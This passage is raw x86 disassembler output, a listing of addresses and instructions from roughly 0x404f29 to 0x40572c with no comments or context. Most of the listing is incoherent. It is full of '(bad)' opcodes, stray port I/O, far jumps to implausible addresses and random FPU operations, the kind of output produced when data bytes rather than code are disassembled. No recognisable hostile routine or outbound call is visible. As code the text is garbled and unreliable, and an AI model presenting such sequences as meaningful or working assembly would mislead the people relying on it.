  404f29:	dec    ebx
  404f2a:	les    edi,FWORD PTR ds:0xada402f8
  404f30:	call   0xdaa6:0x82b5e603
  404f37:	les    ebx,FWORD PTR [esi]
  404f39:	fcmovnbe st,st(0)
  404f3b:	adc    al,0xbd
  404f3d:	loope  0x404f6e
  404f3f:	adc    al,0x2a
  404f41:	ret    0x57a4
  404f44:	ror    DWORD PTR [ecx+0x6baa5d27],0x77
  404f4b:	mov    ah,0x6d
  404f4d:	popa   
  404f4e:	mov    ah,bh
  404f50:	mov    ch,0xd9
  404f52:	or     ebx,DWORD PTR ds:0x58cc1269
  404f58:	pop    ds
  404f59:	nop
  404f5a:	les    edx,FWORD PTR [eax-0x3f6edfce]
  404f60:	adc    BYTE PTR [eax+0x3faf453],0x73
  404f67:	add    ecx,esi
  404f69:	out    dx,al
  404f6a:	sub    al,0x11
  404f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f6d:	dec    esp
  404f6e:	cmp    al,0x83
  404f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f71:	adc    ecx,DWORD PTR [esp+ebp*1]
  404f74:	jne    0x404f99
  404f76:	ins    DWORD PTR es:[edi],dx
  404f77:	mov    ds:0x4b5f922e,eax
  404f7c:	int    0xa7
  404f7e:	(bad)
  404f81:	and    al,0x2
  404f83:	push   ebx
  404f84:	sbb    DWORD PTR [esi],0xbbe9d0e6
  404f8a:	pop    esi
  404f8b:	fimul  DWORD PTR [esi-0x383b221c]
  404f91:	adc    al,0xd
  404f93:	fld    DWORD PTR [esi-0x51]
  404f96:	sbb    BYTE PTR ss:[edi+0x49610750],cl
  404f9d:	outs   dx,BYTE PTR ds:[esi]
  404f9e:	int    0x79
  404fa0:	fistp  QWORD PTR [si]
  404fa3:	jo     0x404ffa
  404fa5:	das    
  404fa6:	into   
  404fa7:	ins    DWORD PTR es:[edi],dx
  404fa8:	mov    ah,BYTE PTR [esi+0x43f9098c]
  404fae:	ret    
  404faf:	gs in  al,dx
  404fb1:	cld    
  404fb2:	out    dx,eax
  404fb3:	mov    esi,0x59405562
  404fb8:	icebp  
  404fb9:	mov    ebx,0x7801eeca
  404fbe:	jo     0x404f50
  404fc0:	test   eax,0xd820ea3e
  404fc5:	(bad)  
  404fc6:	mov    eax,0x8248187e
  404fcb:	idiv   cl
  404fcd:	push   edi
  404fce:	std    
  404fcf:	xchg   BYTE PTR [edx+edi*2],ah
  404fd2:	pop    ds
  404fd3:	pop    ebx
  404fd4:	mov    bl,0x6d
  404fd6:	push   edi
  404fd7:	or     al,0x5
  404fd9:	sub    al,0x10
  404fdb:	sbb    eax,0x3427ce1
  404fe0:	mov    dl,0x78
  404fe2:	ins    BYTE PTR es:[edi],dx
  404fe3:	push   cs
  404fe4:	aaa    
  404fe5:	sar    BYTE PTR [edi],1
  404fe7:	aam    0xf4
  404fe9:	icebp  
  404fea:	inc    ebp
  404feb:	std    
  404fec:	stos   BYTE PTR es:[edi],al
  404fed:	or     ecx,DWORD PTR [eax+0x22]
  404ff0:	fsubr  QWORD PTR [esi+esi*4]
  404ff3:	ret    0xbe08
  404ff6:	mov    edx,0x9a7c3cda
  404ffb:	push   0x58
  404ffd:	shl    DWORD PTR [ecx+0x76b8d9c9],0x79
  405004:	fiadd  WORD PTR [eax+0x2bd44589]
  40500a:	sbb    eax,0x42a3fd
  40500f:	jmp    0x40551a
  405014:	ret    0x3cd0
  405017:	int3   
  405018:	fcmovbe st,st(4)
  40501a:	rcl    dh,cl
  40501c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501d:	or     eax,0x551a7aa3
  405022:	xor    ah,BYTE PTR [ecx]
  405024:	and    BYTE PTR ds:0x7c6a7878,dh
  40502a:	js     0x4050a4
  40502c:	jns    0x405009
  40502e:	adc    al,0x69
  405030:	outs   dx,DWORD PTR ds:[esi]
  405031:	cdq    
  405032:	mov    eax,0xc65364d2
  405037:	inc    edi
  405038:	test   eax,0x6d871837
  40503d:	dec    esp
  40503e:	and    eax,DWORD PTR [edi]
  405040:	sti    
  405041:	cmp    ah,BYTE PTR [ecx+0x60]
  405044:	jo     0x404fdc
  405046:	jmp    0x2d0054d1
  40504b:	jb     0x404fce
  40504d:	inc    edx
  40504e:	xor    bh,0xbe
  405051:	or     esp,DWORD PTR [ecx+0x7c4c6795]
  405057:	and    BYTE PTR [eax+0x4e],0x52
  40505b:	fidivr DWORD PTR [ebx-0x17]
  40505e:	cdq    
  40505f:	and    DWORD PTR [ebx-0x132b451b],ebx
  405065:	icebp  
  405066:	shl    BYTE PTR [edi-0x59],1
  405069:	data16 (bad) 
  40506b:	mov    esp,0x84964864
  405070:	dec    ebp
  405071:	je     0x40509a
  405073:	test   eax,0xae4fae55
  405078:	(bad)  
  405079:	mov    ebp,0x32c59db4
  40507e:	cwde   
  40507f:	xor    dh,BYTE PTR ds:0x9c7c63c1
  405085:	sahf   
  405086:	pop    esi
  405087:	xchg   BYTE PTR [edx],dh
  405089:	test   eax,0x25d2d8ad
  40508e:	pop    ecx
  40508f:	inc    ebx
  405090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405091:	sbb    edx,DWORD PTR [ebp-0x21c54132]
  405097:	jae    0x4050c4
  405099:	icebp  
  40509a:	dec    ecx
  40509b:	xor    eax,0xd7c9ecec
  4050a0:	repz pop edi
  4050a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050a3:	rol    BYTE PTR [eax+0x30],0x12
  4050a7:	aas    
  4050a8:	cwde   
  4050a9:	lods   al,BYTE PTR ds:[esi]
  4050aa:	lods   eax,DWORD PTR ds:[esi]
  4050ab:	rol    WORD PTR [edi+0x3b],cl
  4050af:	sub    ecx,DWORD PTR [edi]
  4050b1:	mov    eax,ds:0xcfb714fa
  4050b6:	mov    ecx,0x362a75ec
  4050bb:	mov    ch,dl
  4050bd:	pop    esp
  4050be:	and    al,0xdb
  4050c0:	cmp    eax,0x972aa52c
  4050c5:	fnstsw WORD PTR [ecx+0x41540d72]
  4050cb:	mov    ah,0x3f
  4050cd:	fbld   TBYTE PTR [esi-0x774698fc]
  4050d3:	jno    0x4050a1
  4050d5:	mov    al,BYTE PTR [edx-0x5b]
  4050d8:	cmp    edi,ebp
  4050da:	xchg   bh,dl
  4050dc:	jl     0x4050bd
  4050de:	out    dx,al
  4050df:	imul   esp,ecx,0x24
  4050e2:	ins    BYTE PTR es:[edi],dx
  4050e3:	sub    eax,0x5ce91af9
  4050e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e9:	xchg   edx,eax
  4050ea:	xor    eax,0xa6ba3a87
  4050ef:	test   DWORD PTR [edi-0x5e],esi
  4050f2:	jmp    DWORD PTR [ebx+0x2a30996c]
  4050f8:	test   eax,0x92512a1c
  4050fd:	add    al,0x6e
  4050ff:	jmp    0x405150
  405101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405102:	xchg   ebx,eax
  405103:	mov    esp,DWORD PTR [edx-0x4f080e97]
  405109:	fcomp  DWORD PTR [ecx]
  40510b:	mov    DWORD PTR [ebx+0x356674c9],edi
  405111:	mov    ds:0xaeb93b53,al
  405116:	and    ebx,ebp
  405118:	pop    edi
  405119:	add    BYTE PTR [eax+0x5c],al
  40511c:	mov    ds:0xce415c30,eax
  405121:	xor    eax,0x7a305ebb
  405126:	jmp    0x405125
  405128:	fidivr WORD PTR [ebp-0x31]
  40512b:	call   0x5711ff66
  405130:	sbb    al,0x3d
  405132:	cmp    eax,DWORD PTR [ebx+0x5ded471b]
  405138:	ins    DWORD PTR es:[edi],dx
  405139:	mov    al,0xd7
  40513c:	cld    
  40513d:	rcl    esp,1
  40513f:	jg     0x405129
  405141:	stc    
  405142:	out    0x90,al
  405144:	and    eax,0xe216db7e
  405149:	mov    cl,bl
  40514b:	arpl   WORD PTR [ebp-0x6b],di
  40514e:	test   BYTE PTR [ecx],bh
  405150:	inc    edi
  405151:	push   eax
  405152:	sub    al,0xc0
  405154:	xchg   edi,eax
  405155:	mov    ecx,0xd49a6bc7
  40515a:	xchg   DWORD PTR [edx],ebp
  40515c:	adc    al,0xc0
  40515e:	sub    ah,ah
  405160:	mov    bl,0x70
  405162:	leave  
  405163:	sub    al,0x13
  405165:	mov    ebp,0x3bf25b62
  40516a:	popf   
  40516b:	mov    edi,DWORD PTR [edi+0x33]
  40516e:	cli    
  40516f:	push   0x32
  405171:	in     eax,dx
  405172:	jmp    0x5478:0xd005a34e
  405179:	repz sub eax,0x6ac12c0f
  40517f:	fs mov al,0x93
  405182:	(bad)  
  405183:	cmc    
  405184:	and    esp,DWORD PTR [ebx+eiz*1-0x14b0dbea]
  40518b:	int3   
  40518c:	pop    eax
  40518d:	in     al,dx
  40518e:	pop    edx
  40518f:	addr16 out 0xb,eax
  405192:	push   edi
  405193:	xor    bh,dl
  405195:	add    dh,cl
  405197:	cmp    bl,dl
  405199:	dec    ebp
  40519a:	xchg   esi,eax
  40519b:	sbb    edi,DWORD PTR [ecx-0x28]
  40519e:	adc    eax,DWORD PTR [edx+0x64da0ddc]
  4051a4:	mov    ebp,0x9354d0b7
  4051a9:	xlat   BYTE PTR ds:[ebx]
  4051aa:	es icebp 
  4051ac:	es imul esp,ebx,0x2
  4051b0:	add    eax,0x1e4dcc95
  4051b5:	dec    ebp
  4051b6:	aad    0x20
  4051b8:	mov    ebx,0xa6b8ee5e
  4051bd:	add    cl,0xb
  4051c0:	(bad)  
  4051c1:	out    0x48,eax
  4051c3:	sub    eax,0x691fd7f1
  4051c8:	iret   
  4051c9:	sub    ebx,edx
  4051cb:	jbe    0x40517d
  4051cd:	xchg   esi,eax
  4051ce:	or     ch,BYTE PTR [ebp-0x25]
  4051d1:	rcr    BYTE PTR [ebx+0x3b],0x98
  4051d5:	inc    ebp
  4051d6:	sub    al,0x79
  4051d8:	inc    esp
  4051d9:	or     eax,0xe8db8792
  4051de:	cs lahf 
  4051e0:	jns    0x4051e2
  4051e2:	sbb    dh,BYTE PTR ds:0x81f2c576
  4051e8:	test   DWORD PTR [ebp+0x106b62bd],esp
  4051ee:	mov    edi,0x27ca8d2
  4051f3:	repz xchg edx,eax
  4051f5:	cmp    edi,ecx
  4051f7:	cli    
  4051f8:	ja     0x40522e
  4051fa:	and    bh,BYTE PTR [esi]
  4051fc:	sbb    al,0x46
  4051fe:	sub    BYTE PTR [edx],bl
  405200:	mov    eax,0x983d87cc
  405205:	mov    ds:0x1876a0ee,al
  40520a:	mov    al,ds:0x6c9cf1fe
  40520f:	push   ecx
  405210:	cwde   
  405211:	dec    ebp
  405212:	lock lods eax,DWORD PTR ds:[esi]
  405214:	repnz imul DWORD PTR [edi+ebx*1]
  405218:	fistp  QWORD PTR [edi]
  40521a:	sbb    esi,DWORD PTR [eax]
  40521c:	xor    al,0xf0
  40521e:	push   edi
  40521f:	mov    ecx,0xbd19a6cb
  405224:	fcmovb st,st(0)
  405226:	js     0x4051f1
  405228:	mov    ah,0xec
  40522a:	inc    edi
  40522b:	sti    
  40522c:	(bad)  [eax-0x6c038403]
  405232:	add    eax,0x570994ee
  405237:	push   ecx
  405238:	mul    DWORD PTR [ebx-0x2eb094c2]
  40523e:	mov    edi,0x5b1024d8
  405243:	cmp    eax,0xf9029a83
  405248:	ds xchg ecx,eax
  40524a:	or     dl,BYTE PTR [edx+0x52]
  40524d:	mul    BYTE PTR [eax-0x18c1ce6c]
  405253:	fcom   DWORD PTR [edi+0x2270a48]
  405259:	sub    eax,0xbe1e5c6
  40525e:	jae    0x4051e7
  405260:	leave  
  405261:	adc    ebp,DWORD PTR [ebx+ebx*8+0x1c]
  405265:	lods   al,BYTE PTR ds:[esi]
  405266:	shr    BYTE PTR [eax],0xe6
  405269:	jecxz  0x40521a
  40526b:	arpl   di,ax
  40526d:	into   
  40526e:	or     esi,DWORD PTR [ebx+0x15]
  405271:	xchg   ebx,eax
  405272:	dec    ebx
  405273:	popf   
  405274:	fiadd  WORD PTR [esi+eax*4]
  405277:	sbb    ah,BYTE PTR ds:0xc77dc573
  40527d:	test   DWORD PTR [ecx],0x30702505
  405283:	push   0xee3ede57
  405288:	loopne 0x4052f5
  40528a:	mov    bl,0x88
  40528c:	fadd   DWORD PTR [ecx]
  40528e:	fcomp  QWORD PTR [edx-0x1d848595]
  405294:	(bad)  
  405295:	clc    
  405296:	std    
  405297:	leave  
  405298:	dec    eax
  405299:	mov    ch,BYTE PTR [edx-0x5f]
  40529c:	mov    dh,0xf4
  40529e:	inc    ecx
  40529f:	lea    ecx,[esi-0x60]
  4052a2:	adc    BYTE PTR [esi+eiz*4+0x73],bh
  4052a6:	cmp    dh,dh
  4052a8:	stos   DWORD PTR es:[edi],eax
  4052a9:	and    eax,0x1ef4c02c
  4052ae:	dec    eax
  4052af:	int3   
  4052b0:	mov    eax,0x2fb47aef
  4052b5:	jg     0x405334
  4052b7:	mov    ds:0xe829fb9,eax
  4052bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052bd:	fdivp  st(0),st
  4052bf:	jmp    0x40527e
  4052c1:	sbb    esi,0x37fbf3d7
  4052c7:	repnz mov ch,BYTE PTR [esi]
  4052ca:	xor    BYTE PTR [ebx+0x2ce84c08],bl
  4052d0:	mov    esp,0x5e038433
  4052d5:	fist   WORD PTR [edx]
  4052d7:	lods   al,BYTE PTR ds:[esi]
  4052d8:	es sbb eax,0xed3291c4
  4052de:	cmp    BYTE PTR [edi+0x7b],0x7e
  4052e2:	ret    0xad1e
  4052e5:	add    bl,BYTE PTR [eax-0x27607f4f]
  4052eb:	out    0xcc,al
  4052ed:	mov    ah,0x23
  4052ef:	shl    BYTE PTR [edi-0x2377e1eb],cl
  4052f5:	fs jns 0x405304
  4052f8:	fdivr  QWORD PTR [edi]
  4052fa:	xlat   BYTE PTR ds:[ebx]
  4052fb:	push   edi
  4052fc:	mov    al,ds:0xa9695f56
  405301:	xlat   BYTE PTR ds:[ebx]
  405302:	xchg   BYTE PTR [ebx],ch
  405304:	adc    ebp,DWORD PTR [ebp-0x25]
  405307:	push   ebx
  405308:	sar    BYTE PTR [edi+eiz*1],cl
  40530b:	enter  0x68a0,0x28
  40530f:	adc    ebx,DWORD PTR ds:0x7f060eda
  405315:	jae    0x4052d1
  405317:	lods   eax,DWORD PTR ds:[esi]
  405318:	(bad)  
  405319:	es inc eax
  40531b:	add    DWORD PTR [eax+0xb],eax
  40531e:	int    0xbc
  405320:	pop    ss
  405321:	add    al,0x9d
  405323:	bound  edi,QWORD PTR [eax+0x4]
  405326:	shl    BYTE PTR [edi-0x4d37798c],cl
  40532c:	add    DWORD PTR [edi+ebx*4-0x25],ebp
  405330:	adc    ch,BYTE PTR [esi-0x139f7da0]
  405336:	sar    BYTE PTR [ecx],cl
  405338:	popf   
  405339:	sub    al,ch
  40533b:	retf   
  40533c:	lods   al,BYTE PTR ds:[esi]
  40533d:	cmp    esi,DWORD PTR [esi]
  40533f:	cmp    al,bl
  405341:	dec    ebx
  405342:	dec    eax
  405343:	jl     0x4052fa
  405345:	xchg   ebx,eax
  405346:	add    DWORD PTR [edx+0x7a876017],ebx
  40534c:	sahf   
  40534d:	dec    bl
  40534f:	mov    ch,0xec
  405351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405352:	rcl    BYTE PTR [edx+0x5c],1
  405355:	push   edx
  405356:	rol    ebx,0xd5
  405359:	and    esp,esp
  40535b:	into   
  40535c:	and    al,0xcd
  40535e:	test   DWORD PTR [edx],esi
  405360:	jo     0x4053bf
  405362:	push   esi
  405363:	aas    
  405364:	adc    ebp,DWORD PTR [edi]
  405366:	xor    al,0xba
  405368:	out    dx,eax
  405369:	mov    esp,esp
  40536b:	xor    eax,0x3864696f
  405370:	lods   al,BYTE PTR ds:[esi]
  405371:	add    al,0x92
  405373:	stos   BYTE PTR es:[edi],al
  405374:	loopne 0x405388
  405376:	arpl   di,bx
  405378:	sub    eax,0xac6f879
  40537d:	das    
  40537e:	data16 jno 0x405364
  405381:	ror    BYTE PTR [esi+edi*2],1
  405384:	sub    eax,0xf4237dff
  405389:	dec    ebx
  40538a:	fstp   TBYTE PTR [edx+0x74cd66bc]
  405390:	mov    esp,0x7a14fc87
  405395:	dec    esi
  405396:	repnz iret 
  405398:	xor    al,0xdd
  40539a:	fmul   DWORD PTR [edx]
  40539c:	jbe    0x405352
  40539e:	ret    
  40539f:	cld    
  4053a0:	mov    dh,0xb0
  4053a2:	std    
  4053a3:	adc    eax,ecx
  4053a5:	cmp    dh,BYTE PTR [edx-0x2d4d85c9]
  4053ab:	sbb    BYTE PTR [ebp-0x60],ah
  4053ae:	cdq    
  4053af:	adc    BYTE PTR [edi+0x359bc217],al
  4053b5:	int    0x10
  4053b7:	nop
  4053b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053b9:	xchg   esp,eax
  4053ba:	sub    bl,BYTE PTR [ecx-0x749e9f97]
  4053c0:	jae    0x405354
  4053c2:	lods   al,BYTE PTR ds:[esi]
  4053c3:	mov    ebp,0xb66ca6e1
  4053c8:	out    dx,al
  4053c9:	ss loop 0x405393
  4053cc:	jns    0x4053a0
  4053ce:	push   0xffffffcc
  4053d0:	test   DWORD PTR [ebx+0x6e276cf3],edx
  4053d6:	mov    ecx,0xe6df02c5
  4053db:	push   edx
  4053dc:	sub    DWORD PTR [ecx+edx*4+0x85049b5],esi
  4053e3:	js     0x405379
  4053e5:	sbb    bl,dl
  4053e7:	inc    ecx
  4053e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053e9:	mov    ebp,0x1968620b
  4053ee:	jo     0x4053d4
  4053f0:	xor    ebx,edx
  4053f2:	mov    dh,0xeb
  4053f4:	or     dh,dl
  4053f6:	lds    esi,FWORD PTR [ebx-0x2f]
  4053f9:	sub    dh,BYTE PTR [ebp-0x41]
  4053fc:	jmp    0xb3da2059
  405401:	jae    0x405409
  405403:	in     al,0x0
  405405:	mov    al,ds:0xfd3515a3
  40540a:	xchg   edx,eax
  40540b:	outs   dx,DWORD PTR ds:[esi]
  40540c:	call   0xf47a7ba4
  405411:	xchg   ecx,eax
  405412:	mov    ds,WORD PTR [eax-0x2698bb38]
  405418:	xchg   esi,eax
  405419:	and    DWORD PTR [ecx-0x2f],edi
  40541c:	mov    bl,BYTE PTR [edx+0x17]
  40541f:	xchg   edx,eax
  405420:	sbb    dh,BYTE PTR ds:0xfe342041
  405426:	add    eax,0x8411c279
  40542b:	cwde   
  40542c:	inc    ecx
  40542d:	addr16 addr16 dec edx
  405430:	mov    WORD PTR ds:0xbfc66c44,gs
  405436:	pop    edx
  405437:	or     edi,DWORD PTR [eax+0x25fbcb40]
  40543d:	and    eax,0x5feadbfa
  405442:	rcl    eax,0x79
  405445:	sub    bl,BYTE PTR [ebx]
  405447:	mov    esi,0x7234e081
  40544c:	xor    DWORD PTR [esi-0x55f69801],ebp
  405452:	in     eax,dx
  405453:	dec    ebp
  405454:	ret    0xf204
  405457:	sub    bh,0xed
  40545a:	inc    esi
  40545b:	stos   DWORD PTR es:[edi],eax
  40545c:	push   ecx
  40545d:	and    DWORD PTR [eax+esi*1],0xd57e049d
  405464:	inc    ebx
  405465:	sar    edx,0xeb
  405468:	neg    BYTE PTR [ebp+0x63d02e3a]
  40546e:	and    ch,BYTE PTR [edx]
  405470:	cmp    dh,ch
  405472:	jo     0x4054c9
  405474:	and    al,0xa4
  405476:	scas   al,BYTE PTR es:[edi]
  405477:	or     al,0xe0
  405479:	push   edx
  40547a:	sbb    DWORD PTR [esi-0x48e52872],ebx
  405480:	(bad)  
  405482:	jae    0x4054fe
  405484:	or     bh,BYTE PTR [esi+0x17]
  405487:	xor    DWORD PTR [ebp-0x2f],ebp
  40548a:	pop    ebx
  40548b:	dec    ebx
  40548c:	sub    dl,ch
  40548e:	mov    ch,0x21
  405490:	sub    BYTE PTR [edi],bh
  405492:	jb     0x40547c
  405494:	push   eax
  405495:	jmp    0x64330239
  40549a:	add    DWORD PTR [edi],0x47
  40549d:	je     0x405454
  40549f:	clc    
  4054a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054a1:	fiadd  DWORD PTR [ecx-0x5a]
  4054a4:	add    al,0x30
  4054a6:	mov    ebp,0xc989a440
  4054ab:	loopne 0x405454
  4054ad:	push   edi
  4054ae:	sbb    dl,ah
  4054b0:	xchg   esi,eax
  4054b1:	xor    bh,BYTE PTR es:[ecx-0x57]
  4054b5:	fistp  QWORD PTR [eax+0x44]
  4054b8:	jmp    0x4ef:0x8a877ebb
  4054bf:	pop    eax
  4054c0:	mov    eax,ds:0x75489f41
  4054c5:	or     edx,DWORD PTR [ebp+0x17ce9c4c]
  4054cb:	lahf   
  4054cc:	ins    BYTE PTR es:[edi],dx
  4054cd:	fwait
  4054ce:	(bad)  
  4054cf:	outs   dx,DWORD PTR ds:[esi]
  4054d0:	mov    ?,ebp
  4054d2:	scas   al,BYTE PTR es:[edi]
  4054d3:	dec    edi
  4054d4:	jb     0x4054a8
  4054d6:	(bad)  [edx-0x74]
  4054d9:	sbb    eax,DWORD PTR [ecx+0x34]
  4054dc:	test   DWORD PTR [edi+0x4e],ebx
  4054df:	dec    esi
  4054e0:	cs int3 
  4054e2:	lock rol DWORD PTR [ecx+0x529fb67b],cl
  4054e9:	out    dx,al
  4054ea:	stc    
  4054eb:	push   esi
  4054ec:	xlat   BYTE PTR ds:[ebx]
  4054ed:	adc    DWORD PTR [ebx],ecx
  4054ef:	mov    al,ds:0xb49836cb
  4054f4:	dec    ebx
  4054f5:	dec    eax
  4054f6:	loop   0x40554a
  4054f8:	stc    
  4054f9:	in     al,dx
  4054fa:	xor    DWORD PTR [eax+0x72c66bbe],0x7c2001fb
  405504:	xchg   esp,eax
  405505:	jnp    0x405529
  405507:	add    al,0xc4
  405509:	cmp    dl,BYTE PTR [eax+0x6d95c3e9]
  40550f:	shl    BYTE PTR [bp-0x60f],cl
  405514:	sbb    ecx,DWORD PTR [esi+0x6]
  405517:	leave  
  405518:	in     eax,0xc3
  40551a:	lea    eax,[ebp-0x98]
  405520:	mov    DWORD PTR [ebp-0x8],eax
  405523:	jmp    0x405a2e
  405528:	(bad)  
  405529:	int    0xc2
  40552b:	aas    
  40552c:	fcmovbe st,st(3)
  40552e:	leave  
  40552f:	aad    0xc0
  405531:	or     al,0x38
  405533:	(bad)
  405536:	test   ebp,edi
  405538:	adc    bh,BYTE PTR [eax]
  40553a:	js     0x4055b4
  40553c:	push   0x7c
  40553e:	js     0x4055b8
  405540:	pop    eax
  405541:	push   edx
  405542:	add    cl,BYTE PTR [ecx+0x42]
  405545:	dec    ebp
  405546:	sub    eax,0x3de90ff6
  40554b:	arpl   WORD PTR [ebx-0x6c443029],dx
  405551:	jne    0x40552d
  405553:	mov    ecx,0x73f3a0de
  405558:	imul   ebx,DWORD PTR [ebp+0x10],0x1e5346de
  40555f:	ins    DWORD PTR es:[edi],dx
  405560:	jns    0x40558e
  405562:	(bad)  
  405563:	popf   
  405564:	jmp    0xb6:0x43ae942f
  40556b:	xor    esi,DWORD PTR [eax+0x56918de2]
  405571:	sahf   
  405572:	fsubrp st(7),st
  405574:	or     edi,DWORD PTR ds:0x89b4f56b
  40557a:	jmp    0x2d59ce84
  40557f:	mov    edi,0x107b46a0
  405584:	adc    dh,BYTE PTR [edx-0xc]
  405587:	mov    edi,ebp
  405589:	mov    WORD PTR [esi+0x738346ae],ds
  40558f:	sub    cl,BYTE PTR [edi+0x43]
  405592:	rcl    DWORD PTR [eax],1
  405594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405595:	jae    0x405563
  405597:	push   ebp
  405598:	dec    ebp
  405599:	jnp    0x405551
  40559b:	lea    eax,[ebx-0x5f]
  40559e:	ror    BYTE PTR [edi],cl
  4055a0:	push   0xffffffcc
  4055a2:	jb     0x405571
  4055a4:	or     bl,dh
  4055a6:	(bad)  
  4055a7:	fdiv   DWORD PTR [eax]
  4055a9:	or     eax,DWORD PTR [eax-0x64]
  4055ac:	rol    cl,1
  4055ae:	and    dl,al
  4055b0:	cmp    al,0xb8
  4055b2:	(bad)  
  4055b3:	mov    bh,0x14
  4055b5:	adc    BYTE PTR [edx],ah
  4055b7:	sbb    eax,0xc67baded
  4055bc:	lock in al,dx
  4055be:	jne    0x405555
  4055c0:	and    ah,ch
  4055c2:	mov    edi,0xbd038d68
  4055c7:	mov    ah,0x3b
  4055c9:	dec    ebp
  4055ca:	jno    0x405642
  4055cc:	mov    cl,0xa
  4055ce:	fld    TBYTE PTR [esi]
  4055d0:	hlt    
  4055d1:	jo     0x405624
  4055d3:	jecxz  0x40555c
  4055d5:	push   edx
  4055d6:	cmp    BYTE PTR [edi+ebx*2+0x4c],0x8d
  4055db:	adc    al,0x38
  4055dd:	jns    0x405626
  4055df:	sar    BYTE PTR [ebx-0x71605488],cl
  4055e5:	dec    ecx
  4055e6:	aad    0x9b
  4055e8:	pop    esi
  4055e9:	dec    ebx
  4055ea:	or     bh,BYTE PTR [ebp-0x1d]
  4055ed:	sbb    eax,0xc09e262f
  4055f2:	adc    BYTE PTR [edi-0x1ccab81b],dl
  4055f8:	adc    edx,esi
  4055fa:	es ds mov ah,0xe6
  4055fe:	xchg   ebp,eax
  4055ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405600:	lods   al,BYTE PTR ds:[esi]
  405601:	out    0x94,al
  405603:	jp     0x40562c
  405605:	bound  eax,QWORD PTR [eax+0x1e485daf]
  40560b:	and    al,0x93
  40560d:	jb     0x405686
  40560f:	pop    ds
  405610:	jns    0x40566d
  405612:	adc    al,0x77
  405614:	jp     0x405631
  405616:	sub    al,0xb3
  405618:	adc    edx,ecx
  40561a:	xor    BYTE PTR [ebp-0x39],ch
  40561d:	and    BYTE PTR [edx],al
  40561f:	out    0x39,al
  405621:	sub    eax,0x3e6bf650
  405626:	dec    ebx
  405627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405628:	pop    eax
  405629:	or     BYTE PTR [ebp*4-0xabadf09],al
  405630:	or     dl,BYTE PTR [esi]
  405632:	leave  
  405633:	sub    DWORD PTR [ecx],esp
  405635:	xchg   edx,eax
  405636:	loop   0x4055fc
  405638:	xchg   edi,eax
  405639:	(bad)  
  40563a:	cli    
  40563b:	jno    0x40560f
  40563d:	aas    
  40563e:	shl    BYTE PTR [eax+ecx*1+0x5ea4b44b],1
  405645:	test   al,ah
  405647:	jp     0x40565d
  405649:	bound  esi,QWORD PTR [eax]
  40564b:	mov    al,ds:0xc543d5a5
  405650:	jmp    0xb0b0:0xb0dc2fce
  405657:	imul   ecx,eax,0x49437293
  40565d:	xor    BYTE PTR [edi],ah
  40565f:	mov    bh,0x40
  405661:	dec    ebp
  405662:	mov    ds:0xc8bf65a0,eax
  405667:	xchg   ebp,eax
  405668:	(bad)  
  405669:	cmp    ebx,DWORD PTR [ebp-0x6]
  40566c:	lea    ebp,[edi+0x5d]
  40566f:	dec    ebp
  405670:	cs ds sub eax,0x124d4a1b
  405677:	ins    BYTE PTR es:[edi],dx
  405678:	and    al,0xda
  40567a:	mov    eax,0x37d5a5c5
  40567f:	pop    edx
  405680:	pushf  
  405681:	adc    al,BYTE PTR [eax+0x401baa3d]
  405687:	aad    0x21
  405689:	or     DWORD PTR [ecx+0x58],esp
  40568c:	mov    eax,ds:0xc99248f0
  405691:	jmp    0xebc21bcc
  405696:	cmp    BYTE PTR [ecx],0xe1
  405699:	sbb    al,0xfc
  40569b:	(bad)  
  40569d:	xor    cl,ch
  40569f:	stc    
  4056a0:	lods   al,BYTE PTR ds:[esi]
  4056a1:	pop    edi
  4056a2:	(bad)  
  4056a4:	call   0x6e05e7f9
  4056a9:	and    al,0xcd
  4056ab:	or     al,BYTE PTR [edi+0x148310a0]
  4056b1:	popf   
  4056b2:	push   edx
  4056b3:	push   0xe0ae4d16
  4056b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b9:	xchg   BYTE PTR [edx-0x26db412c],al
  4056bf:	in     eax,dx
  4056c0:	(bad)  
  4056c1:	dec    ebx
  4056c2:	pop    ds
  4056c3:	pop    DWORD PTR [ebp-0x6]
  4056c6:	out    0xe0,eax
  4056c8:	loop   0x4056e9
  4056ca:	and    al,0xf4
  4056cc:	xchg   edx,eax
  4056cd:	inc    eax
  4056ce:	scas   eax,DWORD PTR es:[edi]
  4056cf:	inc    ecx
  4056d0:	add    BYTE PTR [ebx],dl
  4056d2:	imul   esp,DWORD PTR [ecx-0x2ccf2438],0xffffffe1
  4056d9:	adc    eax,0xa9923529
  4056de:	mov    al,ds:0xa50cefd9
  4056e3:	ins    DWORD PTR es:[edi],dx
  4056e4:	add    BYTE PTR [ebx+0x6],ch
  4056e7:	mov    edi,0x144e72c6
  4056ec:	das    
  4056ed:	sbb    ebx,ebp
  4056ef:	and    al,0xc4
  4056f1:	jg     0x40571d
  4056f3:	adc    DWORD PTR [ebp-0x43],ebp
  4056f6:	mov    ebp,DWORD PTR [eax+edi*4-0x46bdbc08]
  4056fd:	or     BYTE PTR [edi+0x5784a1d2],ah
  405703:	pushf  
  405704:	mul    eax
  405706:	cmp    eax,0xcd6d2f11
  40570b:	jns    0x40578a
  40570d:	jbe    0x40572a
  40570f:	out    dx,al
  405710:	andnps xmm4,XMMWORD PTR [ebx-0x2c]
  405714:	loopne 0x4056e2
  405716:	fwait
  405717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405718:	retf   
  405719:	xor    ch,ch
  40571b:	cdq    
  40571c:	mov    cl,BYTE PTR [ebp+0x64ccc6a]
  405722:	mov    al,ds:0x90b9189c
  405727:	adc    eax,0xe541b289
  40572c:	dec    ebx
